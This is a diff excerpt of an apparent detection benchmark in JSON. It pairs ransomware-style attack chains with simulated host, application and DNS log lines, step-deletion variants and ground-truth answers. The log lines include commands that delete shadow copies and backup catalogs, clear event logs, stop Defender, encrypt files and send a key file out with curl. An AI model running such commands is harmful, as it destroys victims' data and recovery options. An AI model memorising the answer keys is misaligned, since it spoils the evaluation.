+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3,
+      4
+     ],
+     "variant": "del1",
+     "n_lines": 4,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del2",
+     "n_lines": 3,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2",
+      "S4"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S4",
+       "label": "主机命令（cmd.exe）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3,
+      4
+     ],
+     "variant": "delweb",
+     "n_lines": 4,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1082": {
+   "unit": 1082,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "凭据复用横向登录文件服务器后关闭恢复环境并加密数据盘",
+   "source_sequence": [
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（net）",
+     "n_lines": 1,
+     "lines": [
+      "net use \\\\10.20.3.61\\files$ && bcdedit /set recoveryenabled no cmd.exe cmd.exe /c net use <== cmd.exe /c net <"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（cipher）",
+     "n_lines": 1,
+     "lines": [
+      "cipher /e /s:C:\\files\\2026q2 cipher.exe cipher.exe /e /s:C:\\files\\2026q2 <== cmd.exe /c cipher.exe"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "full",
+     "n_lines": 2,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1",
+      "S2"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del1",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（cipher）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（cipher）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "与 del1 等价（只有 2 步）",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（cipher）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（cipher）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1083": {
+   "unit": 1083,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "RDP 弱口令爆破成功后删除备份编录并外传加密密钥",
+   "source_sequence": [
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（mstsc）",
+     "n_lines": 1,
+     "lines": [
+      "mstsc /v:10.20.3.61 && wbadmin delete catalog -quiet && cipher /e /s:C:\\db && curl -T C:\\db\\.k 10.20.5.19 cmd."
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "dns"
+     ],
+     "label": "DNS C2（265662bc.tafmez-4b19.net）",
+     "n_lines": 3,
+     "lines": [
+      "265662bc.tafmez-4b19.net A 192.0.2.128",
+      "93624ea4.tafmez-4b19.net A 10.10.24.146",
+      "c29e4024.tafmez-4b19.net A 10.10.35.69"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1",
+      "S2"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del1",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "DNS C2（265662bc.tafmez-4b19.net）",
+     "gt_next_sources": [
+      "dns"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "DNS C2（265662bc.tafmez-4b19.net）",
+       "sources": [
+        "dns"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "与 del1 等价（只有 2 步）",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "DNS C2（265662bc.tafmez-4b19.net）",
+     "gt_next_sources": [
+      "dns"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "DNS C2（265662bc.tafmez-4b19.net）",
+       "sources": [
+        "dns"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1084": {
+   "unit": 1084,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-003",
+   "technique": "注册每日计划任务投放加密脚本并删除 C 盘卷影副本",
+   "source_sequence": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（schtasks）",
+     "n_lines": 1,
+     "lines": [
+      "schtasks /create /tn OpsSync /tr \"cmd.exe /c C:\\ProgramData\\ops.bat\" /sc daily /ru SYSTEM <== cmd.exe /c schta"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（vssadmin）",
+     "n_lines": 1,
+     "lines": [
+      "vssadmin delete shadows /all /quiet /for=C: cmd.exe cmd.exe /c vssadmin delete shadows /for=C: <== cmd.exe /c "
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（openssl）",
+     "n_lines": 1,
+     "lines": [
+      "openssl enc -aes-256-cbc -pbkdf2 -salt -in C:\\share\\2026Q2.xlsx -out C:\\share\\2026Q2.xlsx.lock <== cmd.exe /c "
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2
+     ],
+     "variant": "full",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2
+     ],
+     "variant": "del1",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（vssadmin）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（vssadmin）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（vssadmin）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（vssadmin）",
+       "sources": [
+        "hids"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（openssl）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1085": {
+   "unit": 1085,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "PowerShell 载入器清理安全日志并删除卷影后循环加密文档",
+   "source_sequence": [
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（wevtutil）",
+     "n_lines": 1,
+     "lines": [
+      "wevtutil cl System && wbadmin delete catalog -quiet cmd.exe cmd.exe /c wevtutil cl System <== services.exe <=="
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（powershell）",
+     "n_lines": 1,
+     "lines": [
+      "powershell -c \"$a=[Security.Cryptography.Aes]::Create();gci C:\\docs -r|%{$e=$a.CreateEncryptor();[IO.File]::Wr"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "full",
+     "n_lines": 2,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1",
+      "S2"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del1",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（powershell）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（powershell）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "与 del1 等价（只有 2 步）",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（powershell）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（powershell）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1086": {
+   "unit": 1086,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "停用 SQL Server 业务服务后删除卷影并加密 MDF 数据文件",
+   "source_sequence": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（net）",
+     "n_lines": 1,
+     "lines": [
+      "net stop MSSQLSERVER && net stop SQLSERVERAGENT cmd.exe cmd.exe /c net stop MSSQLSERVER <== cmd.exe /c net <=="
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（vssadmin）",
+     "n_lines": 1,
+     "lines": [
+      "vssadmin delete shadows /all /quiet && vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB <== cmd.exe"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（openssl）",
+     "n_lines": 1,
+     "lines": [
+      "openssl enc -aes-256-cbc -in C:\\SQL\\DATA\\orders.mdf -out C:\\SQL\\DATA\\orders.mdf.lock <== cmd.exe /c openssl <="
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2
+     ],
+     "variant": "full",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2
+     ],
+     "variant": "del1",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（vssadmin）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（vssadmin）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（vssadmin）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（vssadmin）",
+       "sources": [
+        "hids"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（openssl）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1087": {
+   "unit": 1087,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "挂载共享盘并删除编录后用 gpg 递归批量加密 Office 文档",
+   "source_sequence": [
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（net）",
+     "n_lines": 1,
+     "lines": [
+      "net use Z: \\\\10.20.4.88\\share && wbadmin delete catalog -quiet cmd.exe cmd.exe /c net <== cmd.exe /c net <== s"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（for）",
+     "n_lines": 1,
+     "lines": [
+      "for /r Z:\\ %i in (*.docx *.xlsx) do gpg -c --batch --passphrase-file /tmp/.k --yes %i cmd.exe cmd.exe /c for /"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "full",
+     "n_lines": 2,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1",
+      "S2"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del1",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（for）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（for）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "与 del1 等价（只有 2 步）",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（for）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（for）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1088": {
+   "unit": 1088,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "批量打包加密业务目录并投放 README_RESTORE.txt 说明文件",
+   "source_sequence": [
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-node-33.ops-corp.com/api/v1/files/bulk {\"upload\": \"README_RESTORE.txt\", \"cmd\": \"gpg -c -o /srv.tgz"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（rm）",
+     "n_lines": 1,
+     "lines": [
+      "rm -rf /backup/* && tar czf - /srv/share | gpg -c -o /srv/share.tgz.gpg tar tar czf - /srv <== /bin/bash -c 'r"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "full",
+     "n_lines": 2,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1",
+      "S2"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del1",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（rm）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（rm）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "与 del1 等价（只有 2 步）",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（rm）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（rm）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1089": {
+   "unit": 1089,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "停用实时防护进程后删除卷影并用 cipher 批量加密运维目录",
+   "source_sequence": [
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（net）",
+     "n_lines": 1,
+     "lines": [
+      "net stop WinDefend && vssadmin delete shadows /all /quiet && gpg -c --batch --passphrase-file C:\\k.dat --yes C"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0
+     ],
+     "variant": "full",
+     "n_lines": 1,
+     "n_steps": 1,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": false,
+     "note": "删步后无日志（等同 blind 条件）",
+     "kept_idx": [],
+     "variant": "del1",
+     "n_lines": 0,
+     "n_steps": 1,
+     "observed_steps": [],
+     "missing_steps": [
+      "S1"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S1",
+     "gt_next_label": "主机命令（net）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S1",
+       "label": "主机命令（net）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "删步后无日志（等同 blind 条件）",
+     "kept_idx": [],
+     "variant": "del2",
+     "n_lines": 0,
+     "n_steps": 1,
+     "observed_steps": [],
+     "missing_steps": [
+      "S1"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S1",
+     "gt_next_label": "主机命令（net）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S1",
+       "label": "主机命令（net）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1090": {
+   "unit": 1090,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "通过 wmic 远程节点分发加密器并清除目标主机编录",
+   "source_sequence": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（wmic）",
+     "n_lines": 1,
+     "lines": [
+      "wmic /node:10.20.8.14 process call create \"cmd.exe /c copy \\\\10.20.3.9\\pub\\l.exe C:\\p.exe\" <== cmd.exe /c wmic"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（wmic）",
+     "n_lines": 1,
+     "lines": [
+      "wmic /node:10.20.8.14 process call create \"cmd.exe /c C:\\p.exe -s C:\\share\" <== cmd.exe /c wmic <== services.e"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（cipher）",
+     "n_lines": 1,
+     "lines": [
+      "cipher /e /s:C:\\share && wbadmin delete catalog -quiet cipher.exe cipher.exe /e /s:C:\\share <== cmd.exe /c cip"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2
+     ],
+     "variant": "full",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2
+     ],
+     "variant": "del1",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（wmic）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（wmic）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（wmic）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（wmic）",
+       "sources": [
+        "hids"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（cipher）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1091": {
+   "unit": 1091,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "加密完成后删除本地归档备份并 shred 加密脚本与密钥自毁",
+   "source_sequence": [
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（openssl）",
+     "n_lines": 1,
+     "lines": [
+      "openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/db/orders.sql -out /srv/db/orders.sql.enc <== /bin/bash -"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（rm）",
+     "n_lines": 1,
+     "lines": [
+      "rm -rf /var/backups/* && shred -u /tmp/.enc.sh shred shred -u /tmp/.enc.sh <== /bin/bash"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "full",
+     "n_lines": 2,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1",
+      "S2"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del1",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（rm）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（rm）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "与 del1 等价（只有 2 步）",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（rm）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（rm）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
